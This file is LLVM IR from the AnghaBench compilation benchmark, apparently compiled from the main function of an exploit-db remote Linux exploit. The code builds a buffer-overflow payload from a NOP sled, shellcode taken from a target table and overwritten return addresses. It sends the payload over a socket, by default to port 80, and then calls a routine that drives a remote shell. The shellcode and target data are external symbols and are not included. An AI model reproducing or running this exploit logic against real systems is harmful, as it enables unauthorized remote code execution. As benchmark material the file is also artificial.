; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_8.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_8.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64, i32, i32, i8*, i64 }

@.str = private unnamed_addr constant [12 x i8] c"dh:o:l:p:t:\00", align 1
@optarg = common dso_local global i32 0, align 4
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@static_crap = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca [200 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 80, i32* %15, align 4
  store i32 250, i32* %16, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 2
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @usage(i8* %22)
  br label %24

24:                                               ; preds = %19, %2
  br label %25

25:                                               ; preds = %47, %24
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call i32 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  store i32 %28, i32* %12, align 4
  %29 = icmp ne i32 %28, -1
  br i1 %29, label %30, label %48

30:                                               ; preds = %25
  %31 = load i32, i32* %12, align 4
  switch i32 %31, label %42 [
    i32 100, label %32
    i32 111, label %33
    i32 112, label %36
    i32 116, label %39
  ]

32:                                               ; preds = %30
  store i32 1, i32* %13, align 4
  br label %47

33:                                               ; preds = %30
  %34 = load i32, i32* @optarg, align 4
  %35 = call i32 @atoi(i32 %34)
  store i32 %35, i32* %16, align 4
  br label %47

36:                                               ; preds = %30
  %37 = load i32, i32* @optarg, align 4
  %38 = call i32 @atoi(i32 %37)
  store i32 %38, i32* %15, align 4
  br label %47

39:                                               ; preds = %30
  %40 = load i32, i32* @optarg, align 4
  %41 = call i32 @atoi(i32 %40)
  store i32 %41, i32* %14, align 4
  br label %47

42:                                               ; preds = %30
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @usage(i8* %45)
  br label %47

47:                                               ; preds = %42, %39, %36, %33, %32
  br label %25

48:                                               ; preds = %25
  %49 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %50 = load i32, i32* %14, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %49, i64 %51
  %53 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %52, i32 0, i32 0
  %54 = load i64, i64* %53, align 8
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %235

56:                                               ; preds = %48
  %57 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %58 = load i32, i32* %14, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %57, i64 %59
  %61 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %60, i32 0, i32 1
  %62 = load i32, i32* %61, align 8
  %63 = call i64 @malloc(i32 %62)
  %64 = inttoptr i64 %63 to i8*
  store i8* %64, i8** %6, align 8
  %65 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %66 = load i32, i32* %14, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %65, i64 %67
  %69 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %68, i32 0, i32 2
  %70 = load i32, i32* %69, align 4
  %71 = icmp eq i32 %70, 1
  br i1 %71, label %72, label %102

72:                                               ; preds = %56
  %73 = load i8*, i8** @static_crap, align 8
  %74 = call i32 @strlen(i8* %73)
  %75 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %76 = load i32, i32* %14, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %75, i64 %77
  %79 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %78, i32 0, i32 3
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @strlen(i8* %80)
  %82 = add nsw i32 %74, %81
  %83 = call i64 @malloc(i32 %82)
  %84 = inttoptr i64 %83 to i8*
  store i8* %84, i8** %7, align 8
  %85 = load i8*, i8** %7, align 8
  %86 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %87 = load i32, i32* %14, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %86, i64 %88
  %90 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %89, i32 0, i32 3
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @strcpy(i8* %85, i8* %91)
  %93 = load i8*, i8** %7, align 8
  %94 = load i8*, i8** @static_crap, align 8
  %95 = call i32 @strcat(i8* %93, i8* %94)
  %96 = load i8*, i8** %7, align 8
  %97 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %98 = load i32, i32* %14, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %97, i64 %99
  %101 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %100, i32 0, i32 3
  store i8* %96, i8** %101, align 8
  br label %102

102:                                              ; preds = %72, %56
  %103 = load i8*, i8** %6, align 8
  %104 = load i32, i32* @NOP, align 4
  %105 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %106 = load i32, i32* %14, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %105, i64 %107
  %109 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %108, i32 0, i32 1
  %110 = load i32, i32* %109, align 8
  %111 = call i32 @memset(i8* %103, i32 %104, i32 %110)
  %112 = load i8*, i8** %6, align 8
  %113 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %114 = load i32, i32* %14, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %113, i64 %115
  %117 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %116, i32 0, i32 1
  %118 = load i32, i32* %117, align 8
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %112, i64 %119
  %121 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %122 = load i32, i32* %14, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %121, i64 %123
  %125 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %124, i32 0, i32 3
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @strlen(i8* %126)
  %128 = add nsw i32 %127, 8
  %129 = sext i32 %128 to i64
  %130 = sub i64 0, %129
  %131 = getelementptr inbounds i8, i8* %120, i64 %130
  %132 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %133 = load i32, i32* %14, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %132, i64 %134
  %136 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %135, i32 0, i32 3
  %137 = load i8*, i8** %136, align 8
  %138 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %139 = load i32, i32* %14, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %138, i64 %140
  %142 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %141, i32 0, i32 3
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @strlen(i8* %143)
  %145 = call i32 @memcpy(i8* %131, i8* %137, i32 %144)
  %146 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %147 = load i32, i32* %14, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %146, i64 %148
  %150 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %149, i32 0, i32 0
  %151 = load i64, i64* %150, align 8
  %152 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %153 = load i32, i32* %14, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %152, i64 %154
  %156 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %155, i32 0, i32 4
  %157 = load i64, i64* %156, align 8
  %158 = sub nsw i64 %151, %157
  %159 = load i8*, i8** %6, align 8
  %160 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %161 = load i32, i32* %14, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %160, i64 %162
  %164 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %163, i32 0, i32 1
  %165 = load i32, i32* %164, align 8
  %166 = sub nsw i32 %165, 8
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8, i8* %159, i64 %167
  %169 = bitcast i8* %168 to i64*
  store i64 %158, i64* %169, align 8
  %170 = load i32, i32* %14, align 4
  %171 = icmp eq i32 %170, 4
  br i1 %171, label %172, label %184

172:                                              ; preds = %102
  %173 = load i8*, i8** %6, align 8
  %174 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %175 = load i32, i32* %14, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %174, i64 %176
  %178 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %177, i32 0, i32 1
  %179 = load i32, i32* %178, align 8
  %180 = sub nsw i32 %179, 8
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8, i8* %173, i64 %181
  %183 = bitcast i8* %182 to i64*
  store i64 3217028692, i64* %183, align 8
  br label %184

184:                                              ; preds = %172, %102
  %185 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %186 = load i32, i32* %14, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %185, i64 %187
  %189 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %188, i32 0, i32 0
  %190 = load i64, i64* %189, align 8
  %191 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %192 = load i32, i32* %14, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %191, i64 %193
  %195 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %194, i32 0, i32 4
  %196 = load i64, i64* %195, align 8
  %197 = sub nsw i64 %190, %196
  %198 = load i8*, i8** %6, align 8
  %199 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %200 = load i32, i32* %14, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %199, i64 %201
  %203 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %202, i32 0, i32 1
  %204 = load i32, i32* %203, align 8
  %205 = sub nsw i32 %204, 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i8, i8* %198, i64 %206
  %208 = bitcast i8* %207 to i64*
  store i64 %197, i64* %208, align 8
  %209 = load i32, i32* %13, align 4
  %210 = icmp eq i32 %209, 1
  br i1 %210, label %211, label %234

211:                                              ; preds = %184
  %212 = load i8*, i8** %6, align 8
  %213 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %214 = load i32, i32* %14, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %213, i64 %215
  %217 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %216, i32 0, i32 1
  %218 = load i32, i32* %217, align 8
  %219 = sub nsw i32 %218, 8
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %212, i64 %220
  %222 = bitcast i8* %221 to i64*
  store i64 1094795585, i64* %222, align 8
  %223 = load i8*, i8** %6, align 8
  %224 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %225 = load i32, i32* %14, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %224, i64 %226
  %228 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %227, i32 0, i32 1
  %229 = load i32, i32* %228, align 8
  %230 = sub nsw i32 %229, 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds i8, i8* %223, i64 %231
  %233 = bitcast i8* %232 to i64*
  store i64 1094795585, i64* %233, align 8
  br label %234

234:                                              ; preds = %211, %184
  br label %235

235:                                              ; preds = %234, %48
  %236 = load i32, i32* %15, align 4
  %237 = call i32 @open_socket(i32 %236)
  store i32 %237, i32* %10, align 4
  %238 = load i32, i32* %10, align 4
  %239 = load i8*, i8** %6, align 8
  %240 = load i8*, i8** %6, align 8
  %241 = call i32 @strlen(i8* %240)
  %242 = call i32 @write(i32 %238, i8* %239, i32 %241)
  %243 = load i32, i32* %10, align 4
  %244 = call i32 @write(i32 %243, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i32 1)
  %245 = load i32, i32* %10, align 4
  %246 = call i32 @write(i32 %245, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i32 1)
  %247 = call i32 @sleep(i32 1)
  %248 = load i32, i32* %10, align 4
  %249 = call i32 @sh(i32 %248)
  %250 = load i32, i32* %10, align 4
  %251 = call i32 @close(i32 %250)
  ret i32 0
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @open_socket(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @sh(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
